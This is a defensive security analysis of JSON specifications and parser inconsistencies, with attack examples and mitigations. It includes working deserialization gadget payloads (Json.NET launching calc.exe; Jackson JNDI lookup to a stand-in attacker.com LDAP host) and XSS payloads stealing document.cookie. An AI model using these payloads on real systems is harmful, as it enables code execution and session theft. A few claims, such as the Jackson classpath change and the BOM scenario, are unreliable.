# JSON Specification Security Analysis: Direct Extraction from RFC 8259 and ECMA-404

> **Analysis Target**: RFC 8259 (The JavaScript Object Notation Data Interchange Format), ECMA-404 (The JSON Data Interchange Syntax)
> **Methodology**: Threat landscape research → Specification deep dive → Attack vector mapping → Security control extraction
> **Latest Cases Reflected**: 2024-2025 CVEs and research
> **Language**: English

---

## Executive Summary

This analysis examines JSON security through direct specification review of RFC 8259 and ECMA-404, cross-referenced with real-world vulnerabilities (CVE-2024-43485, CVE-2024-21907, CVE-2024-57699) and security research from Black Hat USA 2017 ("Friday the 13th: JSON Attacks") and Bishop Fox's 2024 JSON interoperability research.

**Critical Finding**: The specifications intentionally leave key behaviors undefined or "implementation-specific," creating parser inconsistencies that attackers exploit in multi-component architectures. Unlike protocol vulnerabilities that stem from implementation bugs, JSON security issues arise from *specification design decisions* that prioritize flexibility over security.

---

## Part I: Specification Architecture and Security Design Decisions

### 1. Intentional Ambiguity: Implementation-Defined Behavior (RFC 8259 §4, §6)

**Specification Behavior**:
RFC 8259 explicitly permits divergent parser implementations:
- *"The names within an object SHOULD be unique... An object whose names are not unique... behavior of software that receives such an object is **unpredictable**."* (RFC 8259 §4)
- *"This specification allows implementations to set limits on... number range and precision."* (RFC 8259 §6)
- ECMA-404 is *"silent about duplicate keys"* while RFC 8259 only *"recommends"* unique keys, creating standards divergence.

**Security Implication**:
The specification grants permission for parsers to behave differently on the same input. This is not a bug—it's a design philosophy prioritizing parser implementation freedom over deterministic processing.

**Attack Vector: Duplicate Key Precedence Exploitation**

When microservices use different JSON parsers, attackers exploit inconsistent duplicate key handling:

```json
{
  "quantity": 100,
  "price": 10.00,
  "quantity": -50
}
```

**Attack Scenario** (Bishop Fox research):
1. **Validation Service** (Python stdlib, last-key precedence): Sees `quantity: -50`, rejects negative order
2. **Attacker adjusts payload**:
   ```json
   {"quantity": 1, "price": 10.00, "quantity": 1000}
   ```
3. **Cart Service** (Python stdlib, last-key): Validates `quantity: 1000` as positive ✓
4. **Payment Service** (Go jsonparser, first-key): Processes `quantity: 1` → charges $10
5. **Fulfillment Service** (Python stdlib, last-key): Ships 1000 units

**Real-World Cases**:
- Samsung device JSON injection vulnerability (CVE undisclosed, referenced in security research)
- E-commerce fraud through validate-proxy-process architecture exploitation

**Specification-Based Defense**:
RFC 8259 states parsers *"MUST accept all texts that conform to the JSON grammar"* but provides no MUST requirement for duplicate key rejection. Mitigation requires:
- Parser configuration to **reject duplicates** (not spec-mandated)
- Architecture change: Single parser for validation and processing
- JSON Schema validation (though it cannot prevent parsing inconsistencies)

---

### 2. Unicode Handling: Unpaired Surrogates and Character Truncation (RFC 8259 §8.2)

**Specification Behavior**:
RFC 8259 §8.2 warns: *"An implementation may not be able to process... unpaired UTF-16 surrogates"* (U+D800 to U+DFFF). The specification permits but does not require fatal errors.

**Security Implication**:
Different parsers handle invalid Unicode differently:
- **Truncate**: Python ujson drops characters after unpaired surrogates
- **Replace**: Some parsers substitute U+FFFD (replacement character)
- **Preserve**: Store raw bytes, cause errors on re-serialization
- **Fatal error**: Strict RFC compliance

**Attack Vector: Key Collision Through Character Truncation**

```json
{
  "role": "user",
  "superadmin\ud888": false,
  "role": "superadmin"
}
```

**Attack Mechanism**:
1. **Service A** (Python ujson): Truncates `superadmin\ud888` → `superadmin`, creates key collision
2. Depending on precedence, parser may merge keys or use last value
3. **Service B** (strict parser): Sees two distinct `role` keys + one invalid key
4. Authorization check uses truncated key → grants admin privileges

**Real-World Pattern**:
- Privilege escalation in multi-language microservices
- Username normalization attacks (similar to Unicode normalization vulnerabilities)

**Specification-Based Defense**:
RFC 8259 recommends UTF-8 encoding but permits Unicode handling variations. Mitigations:
- *"Replace invalid Unicode with U+FFFD rather than truncating"* (Bishop Fox recommendation, not RFC requirement)
- Reject JSON with unpaired surrogates at API gateway
- Normalize Unicode to NFC/NFD *before* parsing (external to JSON spec)

---

### 3. eval() Prohibition: The Original Sin (RFC 8259 §12)

**Specification Behavior**:
RFC 8259 §12 states: *"Since JSON's syntax is borrowed from JavaScript, it is possible to use that language's 'eval()' function to parse most JSON texts... This generally constitutes an **unacceptable security risk**, since the text could contain executable code along with data declarations."*

**Security Implication**:
The specification explicitly warns against a parsing method but cannot enforce the prohibition. JavaScript's `eval()` naturally parses JSON because JSON is a JavaScript subset (with exceptions: U+2028 LINE SEPARATOR and U+2029 PARAGRAPH SEPARATOR are valid JSON but cause SyntaxError in JavaScript).

**Attack Vector: eval()-Based Code Injection**

```javascript
// Legacy/insecure code
var data = eval('(' + jsonString + ')');
```

**Attacker payload**:
```json
{"user": "admin"}); alert(document.cookie); ({"
```

Results in execution:
```javascript
eval('({"user": "admin"}); alert(document.cookie); ({"})');
```

**Historical Context**:
- Douglas Crockford created `JSON.parse()` (2009) specifically to mitigate eval() risks
- JSONP (JSON with Padding) intentionally used callback-wrapped JSON as executable script—deprecated due to XSS risks

**Specification-Based Defense**:
RFC 8259 states parsers *"MUST accept all texts that conform to the JSON grammar"* but cannot prevent eval() use. Mitigations:
- Use `JSON.parse()` (ES5+) or equivalent safe parsers
- Content Security Policy (CSP) `script-src` restrictions
- Never parse untrusted JSON via eval() or Function() constructors

---

### 4. Number Representation: Precision and Range Undefined (RFC 8259 §6)

**Specification Behavior**:
RFC 8259 §6: *"This specification allows implementations to set limits on the range and precision of numbers... Good interoperability can be achieved by software that expects no more than **IEEE 754 binary64** (double precision) precision."*

The specification provides examples of potentially problematic values:
- *"1E400 or 3.141592653589793238462643383279"* — exceed IEEE 754 double precision

**Security Implication**:
Parsers handle overflow/underflow inconsistently:
- **Infinity**: Go jsonparser returns `0` for overflows
- **Loss of precision**: Silent rounding (e.g., `1.000000000000000005` → `1.0`)
- **String fallback**: Some parsers store unrepresentable numbers as strings
- **Fatal error**: Strict parsers reject out-of-range values

**Attack Vector: Precision-Based Logic Bypass**

```json
{
  "account_balance": 999999999999999999999999999999,
  "withdrawal": 0.0000000000000000001
}
```

**Attack Scenarios**:
1. **Integer Overflow**: `account_balance` wraps to negative in 32-bit systems
2. **Underflow to Zero**: `withdrawal` rounds to `0.0` → free withdrawal
3. **Type Juggling**: Parser stores large number as string `"999..."`, comparisons fail

**Real-World Impact**:
- Financial applications with currency precision loss
- Rate limiting bypass (large negative numbers → unlimited quota)

**Specification-Based Defense**:
RFC 8259 recommends IEEE 754 double precision as *"good interoperability"* baseline. Mitigations:
- Validate number ranges *before* parsing (schema validation)
- Use arbitrary-precision libraries (Java BigDecimal, Python Decimal)
- Reject numbers outside application-defined safe ranges
- Never use floating-point for financial calculations

---

## Part II: Deserialization Vulnerabilities and Type Confusion

### 5. Type Information Embedding: Polymorphic Deserialization RCE (External to Spec)

**Specification Behavior**:
RFC 8259 and ECMA-404 define JSON as a *data serialization format only*—no type metadata. The specification states: *"JSON is agnostic about the semantics of numbers"* and provides no mechanism for type preservation.

**Security Implication**:
Libraries like Jackson (Java) and Json.NET (C#) extend JSON with type discriminators to support object-oriented deserialization. These extensions operate *outside* the specification and introduce the "self-describing attack surface" pattern.

**Attack Vector: TypeNameHandling.All RCE in Json.NET**

**Vulnerable Configuration**:
```csharp
JsonSerializerSettings settings = new JsonSerializerSettings
{
    TypeNameHandling = TypeNameHandling.All  // DANGEROUS
};
JsonConvert.DeserializeObject(untrustedJson, settings);
```

**Attacker Payload** (Friday the 13th: JSON Attacks, Black Hat USA 2017):
```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System"
  },
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib",
    "$values": ["calc.exe"]
  }
}
```

**Execution Flow**:
1. Json.NET reads `$type` field → loads `ObjectDataProvider` class
2. Instantiates `Process` object with `MethodName: Start`
3. Invokes `Process.Start("calc.exe")` → Remote Code Execution

**Real-World CVEs**:
- CVE-2024-21907 (Newtonsoft.Json): Stack overflow via crafted type chains
- Multiple gadget chains documented for .NET Framework classes

**Specification-Based Defense**:
RFC 8259 provides no guidance on type handling—this is entirely library-specific. Mitigations:
- **Never use** `TypeNameHandling.All` or `TypeNameHandling.Auto` with untrusted input
- Use `TypeNameHandling.None` (default in modern versions)
- Whitelist allowed types via `SerializationBinder`
- Validate input schema before deserialization

---

### 6. Jackson Polymorphic Deserialization: Default Typing Vulnerabilities

**Specification Behavior**:
Jackson extends JSON with `@class`, `@type` annotations for polymorphic deserialization. Like Json.NET's extensions, this is *not* part of RFC 8259.

**Attack Vector: enableDefaultTyping() RCE**

**Vulnerable Configuration**:
```java
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);
```

**Attacker Payload**:
```json
{
  "user": {
    "@class": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://attacker.com/exploit",
    "autoCommit": true
  }
}
```

**Execution Flow**:
1. Jackson deserializes to `JdbcRowSetImpl` (gadget class)
2. JNDI lookup to attacker-controlled LDAP server
3. Server returns malicious Java object → Remote Code Execution

**Real-World Impact**:
- Widespread exploitation in Java applications (2017-2019)
- Led to Jackson removing `JdbcRowSetImpl` from default classpath

**Specification-Based Defense**:
RFC 8259 is silent on type systems. Jackson-specific mitigations:
- **Avoid** `enableDefaultTyping()` — use explicit `@JsonTypeInfo` on specific classes
- Whitelist allowed subtypes with `@JsonSubTypes`
- Upgrade Jackson to versions with gadget class mitigations
- Use `PolymorphicTypeValidator` to restrict deserialization

---

### 7. Algorithmic Complexity: Denial of Service via Deep Nesting (CVE-2024-43485, CVE-2024-21907)

**Specification Behavior**:
RFC 8259 states: *"An implementation may set limits on... nesting depth... An implementation may set limits on... the length and character contents of strings."*

The specification permits but does not require depth limits.

**Security Implication**:
Parsers without depth limits are vulnerable to stack exhaustion and algorithmic complexity attacks.

**Attack Vector: Deeply Nested JSON DoS**

```json
{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":
... [repeated 10,000 times] ...
{"a":"value"}}}}}}}}}}}
```

**CVE-2024-43485** (System.Text.Json):
Applications deserializing to models with `[ExtensionData]` property consume O(n²) time/memory for nested objects. Affects .NET 6.0.0-6.0.33, 8.0.0-8.0.8.

**CVE-2024-21907** (Newtonsoft.Json):
High nesting levels cause `StackOverflowException`. Fixed in v13.0.1 with default depth limit.

**CVE-2024-57699** (Json-smart):
Stack exhaustion from large numbers of opening braces `{{{{{{...`. Fixed in v2.5.2.

**Attack Mechanism**:
- **Stack-based parsers**: Deep recursion → stack overflow
- **Heap-based parsers**: Excessive object allocation → OutOfMemoryError
- **Hash collision**: Object with 100k+ duplicate keys → O(n²) lookup time

**Specification-Based Defense**:
RFC 8259 permits depth limits but doesn't mandate them. Mitigations:
- Configure parser depth limits (e.g., Newtonsoft.Json `MaxDepth = 64`)
- Reject payloads exceeding size thresholds (e.g., 1MB)
- Use streaming parsers for large datasets
- Monitor deserialization time/memory usage

---

## Part III: Interoperability Vulnerabilities

### 8. Comment Support: Non-Standard Extensions (RFC 8259 Violation)

**Specification Behavior**:
RFC 8259 grammar does not include comments. JSON5 and JSONC (JSON with Comments) are *separate, incompatible specifications*.

**Security Implication**:
Some parsers (GSON, Newtonsoft.Json, jsonparser) support C-style comments `/* */` or `//`, creating parsing inconsistencies.

**Attack Vector: Comment-Based Key Collision**

```json
{
  "role": "user",
  "super": "/* admin",
  "role": "admin */"
}
```

**Parser Behavior**:
- **Strict RFC parser** (Python stdlib): Syntax error
- **Comment-supporting parser** (Go jsonparser): Removes comment, sees `{"role": "user", "super": "admin"}` with key collision
- **Mixed handling**: First service validates without comments, second processes with comments → logic divergence

**Specification-Based Defense**:
RFC 8259 provides unambiguous grammar without comments. Mitigations:
- Use strict RFC 8259-compliant parsers in production
- Reject JSON with `/*`, `*/`, `//` patterns at API gateway
- If JSONC needed, use separate validation for configuration vs. data interchange

---

### 9. Byte Order Mark (BOM): UTF-8 Encoding Attacks (RFC 8259 §8.1)

**Specification Behavior**:
RFC 8259 §8.1: *"Implementations **MUST NOT** add a byte order mark (U+FEFF) to the beginning of a networked-transmitted JSON text."*

**Security Implication**:
Despite the MUST NOT, some parsers accept BOM (U+FEFF / `0xEF 0xBB 0xBF`), others reject it.

**Attack Vector: BOM-Based Schema Validation Bypass**

```
EF BB BF 7B 22 72 6F 6C 65 22 3A 22 61 64 6D 69 6E 22 7D
(BOM)    {  "  r  o  l  e  "  :  "  a  d  m  i  n  "  }
```

**Attack Scenario**:
1. **Validation Service** (strict parser): Rejects JSON with BOM → blocks payload
2. **Attacker removes BOM check assumption**: Sends valid JSON
3. **Processing Service** (lenient parser): Strips BOM silently, processes payload
4. Or reverse: Validation strips BOM, processing treats it as invalid syntax

**Specification-Based Defense**:
RFC 8259 explicitly forbids BOM for network transmission. Mitigations:
- Reject JSON starting with `0xEF 0xBB 0xBF` at ingress
- Configure parsers to strict RFC mode
- Normalize encoding before multi-stage processing

---

### 10. Floating-Point Special Values: Infinity and NaN (RFC 8259 §6)

**Specification Behavior**:
RFC 8259 does not define `Infinity`, `-Infinity`, or `NaN`. These are JavaScript concepts, not JSON values.

**Security Implication**:
Parsers handle these values inconsistently:
- **JavaScript `JSON.stringify()`**: Converts to `null`
- **Some libraries**: Accept as numbers
- **Strict parsers**: Reject as syntax errors

**Attack Vector: Type Juggling via Special Values**

```json
{
  "credit_limit": Infinity,
  "debt": 1000000
}
```

**Parser Behavior**:
- **Lenient parser**: Stores `Infinity` as numeric type → comparisons always true
- **JavaScript**: Parses to `{"credit_limit": null, "debt": 1000000}`
- **Strict parser**: Syntax error

**Attack Scenario**: If validation service rejects `Infinity` but processing service converts to `null`, type checks may fail:
```javascript
if (credit_limit > debt) { /* approve transaction */ }
// Infinity > 1000000 → true (lenient parser)
// null > 1000000 → false (strict parser after JSON.stringify)
```

**Specification-Based Defense**:
RFC 8259 does not support special values. Mitigations:
- Reject JSON containing literal `Infinity`, `NaN`
- Use schema validation to enforce number types
- Test serialization round-trips for value preservation

---

## Part IV: Injection Attacks

### 11. JSONP Callback Injection: XSS via Callback Parameter

**Specification Behavior**:
JSONP (JSON with Padding) is *not* part of RFC 8259. It's a legacy cross-domain data fetching technique predating CORS.

**Typical JSONP Response**:
```javascript
callback({"user": "alice", "role": "admin"});
```

**Security Implication**:
If the `callback` parameter is unsanitized, attackers inject arbitrary JavaScript.

**Attack Vector: Callback XSS**

**Vulnerable Endpoint**:
```
GET /api/user?callback=processUser
Response: processUser({"user": "alice"});
```

**Attacker Payload**:
```
GET /api/user?callback=alert(document.cookie);//
Response: alert(document.cookie);//({"user": "alice"});
```

**Impact**:
- Cross-Site Scripting (XSS)
- Content Security Policy (CSP) bypass if JSONP endpoint is whitelisted
- Session hijacking via cookie theft

**Real-World Cases**:
- HackerOne report #361951 (Liberapay): Exploiting JSONP callback
- GitHub Advisory GHSA-gv9r-qcjc-5hj7 (SRS): DOM-XSS on JSONP callback

**Specification-Based Defense**:
RFC 8259 does not define JSONP. Mitigations:
- **Deprecate JSONP** — use CORS headers instead
- If JSONP required: Whitelist callback names with regex `^[a-zA-Z0-9_]+$`
- Set `Content-Type: application/json`, never `text/html`
- Implement CSP to restrict inline script execution

---

### 12. Server-Side JSON Injection: Malicious Data Insertion

**Specification Behavior**:
RFC 8259 defines data serialization, not input sanitization. The specification assumes JSON strings are properly escaped.

**Security Implication**:
If user input is concatenated into JSON without escaping, attackers inject additional fields or values.

**Attack Vector: Field Injection via Unsanitized Input**

**Vulnerable Code**:
```python
username = request.GET['username']  # User input: admin", "role": "superadmin
json_string = '{"username": "' + username + '", "role": "user"}'
```

**Resulting JSON**:
```json
{"username": "admin", "role": "superadmin", "role": "user"}
```

**Attack Outcome**:
- Duplicate key exploitation (see §1)
- Privilege escalation if first-key precedence parser used

**Specification-Based Defense**:
RFC 8259 requires proper escaping of special characters (`"`, `\`, control characters). Mitigations:
- **Use library serialization** — never concatenate strings
- Validate input before constructing JSON objects
- Schema validation to detect unexpected fields
- Quote escaping: `"` → `\"`, `\` → `\\`

---

### 13. Client-Side JSON Injection: DOM-Based XSS

**Attack Vector**: JSON data embedded in HTML without encoding

**Vulnerable Code**:
```html
<script>
var config = {{ json_data|safe }};  // Django template, no escaping
</script>
```

**Attacker Payload**:
```json
{"theme": "</script><script>alert(document.cookie)</script><script>"}
```

**Rendered HTML**:
```html
<script>
var config = {"theme": "</script><script>alert(document.cookie)</script><script>"};
</script>
```

**Attack Outcome**: XSS execution in user's browser

**Specification-Based Defense**:
- HTML-encode `<`, `>`, `&` before embedding JSON in HTML
- Use `JSON.parse()` with server-provided data in separate script tag
- Content Security Policy: `script-src 'self'`

---

## Part V: Latest CVE and Attack Cases (2024-2025)

| CVE ID | Component | Vulnerability Type | Attack Mechanism | Fix Version |
|--------|-----------|-------------------|------------------|-------------|
| **CVE-2024-43485** | System.Text.Json (.NET) | Algorithmic Complexity DoS | `[ExtensionData]` property triggers O(n²) behavior on nested objects | .NET 6.0.35, 8.0.10 |
| **CVE-2024-21907** | Newtonsoft.Json | Stack Overflow DoS | High nesting levels cause `StackOverflowException` | v13.0.1 |
| **CVE-2024-57699** | Json-smart (Java) | Stack Exhaustion DoS | Large number of opening braces `{{{{...` | v2.5.2 |
| **N/A** | Samsung Devices | JSON Injection | Exploit chain via JSON injection (details undisclosed) | Patched |

---

## Appendix A: Attack-Spec-Defense Comprehensive Mapping

| Attack Type | Exploited Spec Behavior | RFC Reference | Defense Mechanism |
|-------------|-------------------------|---------------|-------------------|
| **Duplicate Key Exploit** | *"Behavior... is unpredictable"* when names not unique | RFC 8259 §4 | Configure parsers to reject duplicates; use single parser across services |
| **Character Truncation** | *"Implementation may not be able to process... unpaired surrogates"* | RFC 8259 §8.2 | Replace invalid Unicode with U+FFFD; reject unpaired surrogates |
| **eval() Code Injection** | JSON is JavaScript subset → eval() naturally parses it | RFC 8259 §12 | Use `JSON.parse()` only; never `eval()` untrusted data |
| **Number Overflow/Underflow** | *"Implementations... set limits on... number range"* | RFC 8259 §6 | Validate number ranges; use arbitrary-precision types for finance |
| **Polymorphic Deserialization RCE** | Spec provides no type system; libraries add `$type`/`@class` | N/A (extension) | Avoid `TypeNameHandling.All`; whitelist allowed types |
| **Deep Nesting DoS** | *"Implementation may set limits on... nesting depth"* | RFC 8259 §9 | Configure `MaxDepth` (e.g., 64); reject large payloads |
| **Comment-Based Bypass** | RFC grammar excludes comments; some parsers support them | N/A (violation) | Use strict RFC parsers; reject `/*`, `//` patterns |
| **BOM Injection** | *"MUST NOT add... BOM"* but parsers handle inconsistently | RFC 8259 §8.1 | Reject JSON starting with BOM bytes `0xEF 0xBB 0xBF` |
| **Infinity/NaN Type Juggling** | Spec doesn't define special values; parsers diverge | RFC 8259 §6 | Reject literal `Infinity`, `NaN`; test serialization round-trips |
| **JSONP Callback XSS** | JSONP is not JSON; callback wrapping enables script injection | N/A (legacy) | Deprecate JSONP; use CORS; whitelist callback names |
| **Server-Side JSON Injection** | Spec assumes proper escaping; doesn't mandate input validation | RFC 8259 §7 | Use library serialization; never concatenate user input |
| **Client-Side JSON Injection** | JSON embedded in HTML without encoding | N/A (integration) | HTML-encode before embedding; use CSP |

---

## Appendix B: Security Validation Checklist

### Parsing Configuration
- [ ] Parser configured to **reject duplicate keys**
- [ ] Maximum nesting depth set (recommended: 64)
- [ ] Maximum string length enforced
- [ ] Maximum number size validated against IEEE 754 double precision
- [ ] BOM (U+FEFF) rejected at ingress
- [ ] Unpaired UTF-16 surrogates rejected or replaced with U+FFFD
- [ ] Comments (`//`, `/* */`) rejected in strict mode

### Deserialization Security
- [ ] **Never** use `TypeNameHandling.All` or `TypeNameHandling.Auto` (Json.NET)
- [ ] **Never** use `enableDefaultTyping()` with untrusted input (Jackson)
- [ ] Polymorphic types whitelisted via `SerializationBinder` or `@JsonSubTypes`
- [ ] Input validated against JSON Schema before deserialization
- [ ] Deserialization timeout configured to prevent DoS

### Microservice Architecture
- [ ] **Single JSON parser** used consistently across validation and processing services
- [ ] Parser quirks documented (duplicate key precedence, comment support, etc.)
- [ ] Input re-validated after forwarding (don't trust upstream parsing)
- [ ] Encoding normalized (UTF-8) before multi-stage processing

### Injection Prevention
- [ ] **Never concatenate user input** into JSON strings
- [ ] Use library functions (`JSON.stringify()`, `JsonSerializer`, etc.) for serialization
- [ ] HTML-encode JSON before embedding in `<script>` tags
- [ ] JSONP endpoints deprecated or callback names strictly whitelisted `^[a-zA-Z0-9_]+$`
- [ ] Content Security Policy (CSP) enforced: `script-src 'self'`

### Number Handling
- [ ] Financial calculations use arbitrary-precision types (Decimal, BigDecimal)
- [ ] Number ranges validated against application constraints
- [ ] Special values (`Infinity`, `NaN`, `-0`) rejected or handled explicitly
- [ ] Test for precision loss in serialization round-trips

### Attack Surface Reduction
- [ ] API endpoints limit payload size (e.g., 1MB max)
- [ ] Rate limiting on deserialization-heavy endpoints
- [ ] Monitoring for suspicious patterns (excessive nesting, large key counts, etc.)
- [ ] Regular security updates to JSON parsing libraries

---

## Appendix C: Parser Behavior Reference

### Duplicate Key Precedence
| Parser | Language | Precedence | Comments |
|--------|----------|------------|----------|
| Python stdlib `json` | Python | Last-key | RFC 8259 compliant |
| Go `encoding/json` | Go | Last-key | RFC 8259 compliant |
| Go `jsonparser` | Go | First-key | ⚠️ Inconsistent with stdlib |
| Go `gojay` | Go | First-key | ⚠️ Inconsistent |
| Java `json-iterator` | Java | First-key read, last-key serialize | ⚠️ Round-trip failure |
| C++ `rapidjson` | C++ | First-key, reserializes duplicates | ⚠️ Propagates vulnerability |

### Character Truncation
| Parser | Language | Truncates Unpaired Surrogates | Risk Level |
|--------|----------|-------------------------------|------------|
| Python `ujson` | Python | ✅ Yes | 🔴 High |
| PHP `json5` | PHP | ✅ Yes | 🔴 High |
| Rust `json5` | Rust | ✅ Yes | 🔴 High |
| Ruby `simdjson` | Ruby | ✅ Yes | 🔴 High |
| Python stdlib `json` | Python | ❌ No (replaces with U+FFFD) | 🟢 Low |

### Comment Support (Non-Standard)
| Parser | Language | Supports Comments | RFC Compliant |
|--------|----------|------------------|---------------|
| Ruby stdlib | Ruby | ✅ Yes | ❌ No |
| Go `jsonparser` | Go | ✅ Yes | ❌ No |
| Java `GSON` | Java | ✅ Yes (optional) | ❌ No |
| Java `fastjson` | Java | ✅ Yes | ❌ No |
| C# `Newtonsoft.Json` | C# | ✅ Yes (optional) | ❌ No |
| Python stdlib `json` | Python | ❌ No | ✅ Yes |

---

## Conclusion

JSON security vulnerabilities arise not from implementation bugs but from **specification design decisions** that prioritize flexibility over determinism. RFC 8259's *"unpredictable"* and *"implementation may"* language grants permission for parser divergence, which attackers exploit in microservice architectures.

**Key Takeaways**:
1. **Specification ambiguity is weaponized**: Duplicate keys, Unicode handling, number precision—all "implementation-defined"
2. **Deserialization extensions are the highest risk**: Type metadata (`$type`, `@class`) enables RCE when libraries extend JSON beyond RFC 8259
3. **Multi-parser environments amplify risk**: Validation-proxy-processing patterns create blind spots when parsers disagree
4. **Defense requires going beyond the spec**: RFC 8259 compliance is necessary but insufficient—strict parser configuration and architectural controls are essential

The 2024-2025 CVE landscape (System.Text.Json DoS, Newtonsoft.Json stack overflow, Json-smart exhaustion) demonstrates that even modern parsers struggle with RFC 8259's permissive design. Security requires treating JSON as untrusted input, validating at every boundary, and enforcing stricter requirements than the specification mandates.

---

## Sources

- [RFC 8259 - The JavaScript Object Notation (JSON) Data Interchange Format](https://datatracker.ietf.org/doc/html/rfc8259)
- [ECMA-404 - The JSON Data Interchange Syntax](https://ecma-international.org/publications-and-standards/standards/ecma-404/)
- [An Exploration & Remediation of JSON Interoperability Vulnerabilities - Bishop Fox](https://bishopfox.com/blog/json-interoperability-vulnerabilities)
- [Friday the 13th: JSON Attacks - Black Hat USA 2017](https://blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)
- [CVE-2024-43485: System.Text.Json Denial of Service Vulnerability](https://vulert.com/vuln-db/CVE-2024-43485)
- [CVE-2024-21907: Newtonsoft.Json Stack Overflow](https://www.cvedetails.com/cve/CVE-2024-21907/)
- [CVE-2024-57699: Json-smart Stack Exhaustion](https://www.wiz.io/vulnerability-database/cve/cve-2024-57699)
- [Research: How JSON parsers can create security risks - The Daily Swig](https://portswigger.net/daily-swig/research-how-json-parsers-can-create-security-risks-when-it-comes-to-interoperability)
- [Execute commands by sending JSON? Unsafe deserialization in Ruby - GitHub Blog](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/)
- [Breaking the Callback: Exploring JSONP XSS Vulnerabilities](https://vux06.medium.com/breaking-the-callback-exploring-jsonp-xss-vulnerabilities-d15454d123a6)
- [Unicode Normalization Attacks - HackTricks](https://book.hacktricks.xyz/pentesting-web/unicode-injection/unicode-normalization)
- [Null Byte Injection Explained - The Hacker Recipes](https://www.thehacker.recipes/web/inputs/null-byte-injection)
- [Security considerations - Ajv JSON Schema Validator](https://ajv.js.org/security.html)
- [API Schema Pollution - InstaTunnel Blog](https://instatunnel.my/blog/api-schema-pollution-when-malformed-requests-break-your-entire-backend)
